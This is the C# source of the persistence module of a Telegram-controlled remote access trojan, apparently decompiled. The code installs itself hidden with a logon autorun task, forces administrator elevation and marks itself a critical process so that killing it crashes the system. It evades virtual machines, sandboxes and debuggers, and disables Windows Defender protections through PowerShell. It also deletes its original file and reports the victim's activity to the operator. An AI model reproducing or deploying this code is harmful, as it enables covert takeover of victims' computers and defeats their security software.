using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using CosmosKey.Utils;
using Microsoft.Win32;

namespace TelegramRAT;

internal sealed class persistence
{
	public enum EXECUTION_STATE : uint
	{
		ES_CONTINUOUS = 2147483648u,
		ES_DISPLAY_REQUIRED = 2u,
		ES_SYSTEM_REQUIRED = 1u
	}

	public class MainForm : Form
	{
		public const int WM_QUERYENDSESSION = 17;

		public const int WM_ENDSESSION = 22;

		public const uint SHUTDOWN_NORETRY = 1u;

		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool ShutdownBlockReasonCreate(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] string reason);

		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool ShutdownBlockReasonDestroy(IntPtr hWnd);

		[DllImport("kernel32.dll")]
		private static extern bool SetProcessShutdownParameters(uint dwLevel, uint dwFlags);

		public MainForm()
		{
			((Form)this).set_FormBorderStyle((FormBorderStyle)0);
			((Form)this).set_ShowInTaskbar(false);
			((Control)this).set_Visible(false);
			((Form)this).set_Opacity(0.0);
			((Form)this).add_Load((EventHandler)MainForm_Load);
			SetProcessShutdownParameters(1023u, 1u);
		}

		private void MainForm_Load(object sender, EventArgs e)
		{
			((Form)this).set_Size(new Size(0, 0));
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).get_Msg() != 17 && ((Message)(ref m)).get_Msg() != 22)
			{
				((Form)this).WndProc(ref m);
				return;
			}
			Console.WriteLine("[!] Shutdown signal received..");
			ShutdownBlockReasonCreate(((Control)this).get_Handle(), "Please wait...");
			unprotectProcess();
			telegram.sendText("\ud83c\udf42 Target turns off the power on the device...");
			ShutdownBlockReasonDestroy(((Control)this).get_Handle());
			Environment.Exit(0);
		}
	}

	public static Thread processCheckerThread = new Thread(processChecker);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);

	private static List<string> GetProcessList()
	{
		List<string> list = new List<string>();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			list.Add(process.ProcessName.ToUpper());
		}
		return list;
	}

	public static void processChecker()
	{
		if (!config.BlockNetworkActivityWhenProcessStarted)
		{
			return;
		}
		Console.WriteLine("[+] Process checker started");
		while (true)
		{
			List<string> processList = GetProcessList();
			string[] blockNetworkActivityProcessList = config.BlockNetworkActivityProcessList;
			foreach (string text in blockNetworkActivityProcessList)
			{
				string item = text.ToUpper();
				if (!processList.Contains(item) || telegram.waitThreadIsBlocked)
				{
					continue;
				}
				Console.WriteLine("[!] Stopping command listener thread");
				telegram.waitThreadIsBlocked = true;
				while (true)
				{
					processList = GetProcessList();
					if (!processList.Contains(item))
					{
						break;
					}
					Thread.Sleep(1000);
				}
				Console.WriteLine("[+] Restarting command listener thread");
				telegram.waitThreadIsBlocked = false;
				telegram.sendText("\ud83d\ude4a Found blocked process " + text + ".exe");
				break;
			}
			Thread.Sleep(1500);
		}
	}

	public static void protectProcess()
	{
		if (config.ProcessBSODProtectionEnabled)
		{
			Console.WriteLine("[+] Set process critical");
			try
			{
				Process.EnterDebugMode();
				RtlSetProcessIsCritical(1u, 0u, 0u);
			}
			catch
			{
			}
		}
	}

	public static void unprotectProcess()
	{
		if (config.ProcessBSODProtectionEnabled)
		{
			try
			{
				Console.WriteLine("[+] Set process not critical");
				RtlSetProcessIsCritical(0u, 0u, 0u);
			}
			catch
			{
			}
		}
	}

	public static void HideConsoleWindow()
	{
		if (config.HideConsoleWindow)
		{
			Console.WriteLine("[+] Hiding console window");
			ShowWindow(GetConsoleWindow(), 0);
		}
	}

	public static bool inVirtualBox()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		ManagementObjectEnumerator enumerator;
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						if ((current.get_Item("Manufacturer").ToString()!.ToLower() == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || current.get_Item("Manufacturer").ToString()!.ToLower().Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch
		{
			return true;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementBaseObject current2 = enumerator.get_Current();
				if (current2.GetPropertyValue("Name").ToString()!.Contains("VMware") && current2.GetPropertyValue("Name").ToString()!.Contains("VBox"))
				{
					return true;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return false;
	}

	public static bool inSandboxie()
	{
		string[] array = new string[5] { "SbieDll.dll", "SxIn.dll", "Sf2.dll", "snxhk.dll", "cmdvrt32.dll" };
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				if (GetModuleHandle(array[num]).ToInt32() != 0)
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	public static bool inDebugger()
	{
		try
		{
			long ticks = DateTime.Now.Ticks;
			Thread.Sleep(10);
			if (DateTime.Now.Ticks - ticks < 10L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	public static string DetectAntivirus()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			try
			{
				List<string> list = new List<string>();
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						list.Add(current.get_Item("displayName").ToString());
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (list.Count == 0)
				{
					return "N/A";
				}
				return string.Join(", ", list.ToArray()) + ".";
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return "N/A";
		}
	}

	private static void TaskSchedulerCommand(string args)
	{
		if (config.AutorunEnabled)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				FileName = "schtasks.exe",
				Arguments = args
			};
			process.Start();
			process.WaitForExit();
		}
	}

	public static void elevatePrevileges()
	{
		while (!utils.IsAdministrator())
		{
			Console.WriteLine("[~] Trying elevate previleges to administrator...");
			Process process = new Process();
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.FileName = Application.get_ExecutablePath();
			process.StartInfo.Arguments = "";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.Verb = "runas";
			process.StartInfo.CreateNoWindow = true;
			try
			{
				process.Start();
				process.WaitForExit();
				unprotectProcess();
				Environment.Exit(1);
			}
			catch (Win32Exception)
			{
				if (config.AdminRightsRequired)
				{
					continue;
				}
				break;
			}
		}
	}

	public static void installSelf()
	{
		Console.WriteLine("[+] Copying to system...");
		if (!Directory.Exists(Path.GetDirectoryName(config.InstallPath)))
		{
			Directory.CreateDirectory(Path.GetDirectoryName(config.InstallPath));
		}
		if (!File.Exists(config.InstallPath))
		{
			File.Copy(Application.get_ExecutablePath(), config.InstallPath);
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetDirectoryName(config.InstallPath));
			if (config.AttributeHiddenEnabled)
			{
				directoryInfo.Attributes |= FileAttributes.Hidden;
			}
			if (config.AttributeSystemEnabled)
			{
				directoryInfo.Attributes |= FileAttributes.System;
			}
		}
	}

	public static void uninstallSelf()
	{
		Console.WriteLine("[+] Uninstalling from system...");
		unprotectProcess();
		delAutorun();
		string text = Path.GetTempFileName() + ".bat";
		string text2 = Process.GetCurrentProcess().Id.ToString();
		unprotectProcess();
		using (StreamWriter streamWriter = File.AppendText(text))
		{
			streamWriter.WriteLine(":l");
			streamWriter.WriteLine("Tasklist /fi \"PID eq " + text2 + "\" | find \":\"");
			streamWriter.WriteLine("if Errorlevel 1 (");
			streamWriter.WriteLine(" Timeout /T 1 /Nobreak");
			streamWriter.WriteLine(" Goto l");
			streamWriter.WriteLine(")");
			streamWriter.WriteLine("Rmdir /S /Q \"" + Path.GetDirectoryName(config.InstallPath) + "\"");
		}
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C " + text + " & Del " + text,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		Environment.Exit(1);
	}

	public static void runAntiAnalysis()
	{
		if (config.PreventStartOnVirtualMachine && (inSandboxie() || inVirtualBox() || inDebugger()))
		{
			Environment.Exit(2);
		}
	}

	public static void setAutorun()
	{
		Console.WriteLine("[+] Installing to autorun...");
		TaskSchedulerCommand("/create /f /sc ONLOGON /RL HIGHEST /tn \"" + config.AutorunName + "\" /tr \"" + config.InstallPath + "\"");
	}

	public static void delAutorun()
	{
		Console.WriteLine("[+] Uninstalling from autorun...");
		TaskSchedulerCommand("/delete /f /tn \"" + config.AutorunName + "\"");
	}

	public static void CheckMutex()
	{
		bool createdNew = false;
		string text = "2024893777".MD5();
		if (utils.IsAdministrator())
		{
			text = "ADMIN:" + text;
		}
		new Mutex(initiallyOwned: false, text, out createdNew);
		if (!createdNew)
		{
			Console.WriteLine("[?] Already running 1 copy of the program");
			Environment.Exit(1);
		}
	}

	public static void Sleep()
	{
		int num = config.StartDelay * 1000;
		num = new Random().Next(num, num + 3000);
		Console.WriteLine($"[?] Sleeping {num}");
		Thread.Sleep(num);
	}

	public static void MeltFile()
	{
		if (config.MeltFileAfterStart && !(Application.get_ExecutablePath() == config.InstallPath))
		{
			string text = Path.GetTempFileName() + ".bat";
			string text2 = Process.GetCurrentProcess().Id.ToString();
			unprotectProcess();
			using (StreamWriter streamWriter = File.AppendText(text))
			{
				streamWriter.WriteLine(":l");
				streamWriter.WriteLine("Tasklist /fi \"PID eq " + text2 + "\" | find \":\"");
				streamWriter.WriteLine("if Errorlevel 1 (");
				streamWriter.WriteLine(" Timeout /T 1 /Nobreak");
				streamWriter.WriteLine(" Goto l");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine("Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"");
				streamWriter.WriteLine("Cd \"" + Path.GetDirectoryName(config.InstallPath) + "\"");
				streamWriter.WriteLine("Timeout /T 1 /Nobreak");
				streamWriter.WriteLine("Start \"\" \"" + Path.GetFileName(config.InstallPath) + "\"");
			}
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C " + text + " & Del " + text,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Environment.Exit(1);
		}
	}

	public static void PreventSleep()
	{
		try
		{
			SetThreadExecutionState((EXECUTION_STATE)2147483651u);
		}
		catch
		{
		}
	}

	public static void RegistryEdit(string regPath, string name, string value)
	{
		try
		{
			TokenManipulator.AddPrivilege("SeRestorePrivilege");
			TokenManipulator.AddPrivilege("SeBackupPrivilege");
			TokenManipulator.AddPrivilege("SeTakeOwnershipPrivilege");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
				return;
			}
			if (registryKey != null)
			{
				NTAccount nTAccount = new NTAccount("Administrators");
				RegistrySecurity accessControl = registryKey.GetAccessControl();
				accessControl.SetOwner(nTAccount);
				accessControl.AddAccessRule(new RegistryAccessRule(nTAccount, RegistryRights.FullControl, AccessControlType.Allow));
				registryKey.SetAccessControl(accessControl);
				if (registryKey.GetValue(name) != value)
				{
					registryKey.SetValue(name, value, RegistryValueKind.DWord);
				}
			}
		}
		catch (Exception ex)
		{
			try
			{
				telegram.sendText(ex.Message.ToString());
			}
			catch (Exception)
			{
			}
		}
		try
		{
			TokenManipulator.RemovePrivilege("SeRestorePrivilege");
			TokenManipulator.RemovePrivilege("SeBackupPrivilege");
			TokenManipulator.RemovePrivilege("SeTakeOwnershipPrivilege");
		}
		catch (Exception)
		{
		}
	}

	public static void CheckDefender()
	{
		Process process = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = "Get-MpPreference -verbose",
				UseShellExecute = false,
				RedirectStandardOutput = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			}
		};
		process.Start();
		while (!process.StandardOutput.EndOfStream)
		{
			string text = process.StandardOutput.ReadLine();
			if (text.StartsWith("DisableRealtimeMonitoring") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
			}
			else if (text.StartsWith("DisableBehaviorMonitoring") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
			}
			else if (text.StartsWith("DisableBlockAtFirstSeen") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
			}
			else if (text.StartsWith("DisableIOAVProtection") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableIOAVProtection $true");
			}
			else if (text.StartsWith("DisablePrivacyMode") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisablePrivacyMode $true");
			}
			else if (text.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
			}
			else if (text.StartsWith("DisableArchiveScanning") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableArchiveScanning $true");
			}
			else if (text.StartsWith("DisableIntrusionPreventionSystem") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true");
			}
			else if (text.StartsWith("DisableScriptScanning") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableScriptScanning $true");
			}
			else if (text.StartsWith("SubmitSamplesConsent") && !text.EndsWith("2"))
			{
				RunPS("Set-MpPreference -SubmitSamplesConsent 2");
			}
			else if (text.StartsWith("MAPSReporting") && !text.EndsWith("0"))
			{
				RunPS("Set-MpPreference -MAPSReporting 0");
			}
			else if (text.StartsWith("HighThreatDefaultAction") && !text.EndsWith("6"))
			{
				RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force");
			}
			else if (text.StartsWith("ModerateThreatDefaultAction") && !text.EndsWith("6"))
			{
				RunPS("Set-MpPreference -ModerateThreatDefaultAction 6");
			}
			else if (text.StartsWith("LowThreatDefaultAction") && !text.EndsWith("6"))
			{
				RunPS("Set-MpPreference -LowThreatDefaultAction 6");
			}
			else if (text.StartsWith("SevereThreatDefaultAction") && !text.EndsWith("6"))
			{
				RunPS("Set-MpPreference -SevereThreatDefaultAction 6");
			}
		}
	}

	public static void RunPS(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		process.Start();
	}

	public static void DisableDefender()
	{
		string path = "c:\\temp\\MyTest.txt";
		try
		{
			using (FileStream fileStream = File.Create(path))
			{
				byte[] bytes = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetBytes("This is some text in the file.");
				fileStream.Write(bytes, 0, bytes.Length);
			}
			using StreamReader streamReader = File.OpenText(path);
			string text = "";
			while ((text = streamReader.ReadLine()) != null)
			{
				Console.WriteLine(text);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}
}
